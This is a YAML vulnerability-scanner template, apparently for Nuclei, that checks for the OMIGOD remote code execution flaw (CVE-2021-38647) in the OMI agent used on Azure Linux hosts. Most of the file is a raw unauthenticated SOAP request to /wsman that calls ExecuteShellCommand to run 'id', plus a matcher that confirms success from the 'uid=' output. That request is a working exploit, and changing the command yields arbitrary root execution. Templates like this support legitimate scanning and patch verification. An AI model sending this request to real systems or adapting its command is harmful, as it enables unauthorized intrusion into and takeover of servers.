config/51pwn/CVE-2021-38647.yaml

id: CVE-2021-38647_51pwn

info:
  name: OMIGOD – RCE Vulnerability in Multiple Azure Linux Deployments CVE-2021-38647
  author: 51pwn
  severity: Critical
  description: |
    On September 14, multiple vulnerabilities were discovered by researchers at Wiz.io. 
    The most critical of them being CVE-2021-38647, now dubbed OMIGOD, 
    which effects the Open Management Infrastructure (OMI) agent in versions 1.6.8.0 and below.
  reference:
    - https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/

  tags: RCE,Web

requests:
  - raw:
      - |
        POST /wsman HTTP/1.1
        Connection: close
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
        Host: {{Hostname}}
        Content-Type: application/soap+xml;charset=UTF-8

        <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
             <s:Header>
                <a:To>HTTP://192.168.1.1:5986/wsman/</a:To>
                <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
                <a:ReplyTo>
                   <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
                </a:ReplyTo>
                <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
                <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
                <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
                <w:OperationTimeout>PT1M30S</w:OperationTimeout>
                <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
                <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
                <w:OptionSet s:mustUnderstand="true" />
                <w:SelectorSet>
                   <w:Selector Name="__cimnamespace">root/scx</w:Selector>
                </w:SelectorSet>
             </s:Header>
             <s:Body>
                <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
                   <p:command>id</p:command>
                   <p:timeout>0</p:timeout>
                </p:ExecuteShellCommand_INPUT>
             </s:Body>
          </s:Envelope>

      # end
    matchers-condition: and
    matchers: 
      - type: regex
        regex:
          - <p:StdOut>(.*uid=.*)<\/p:StdOut>
      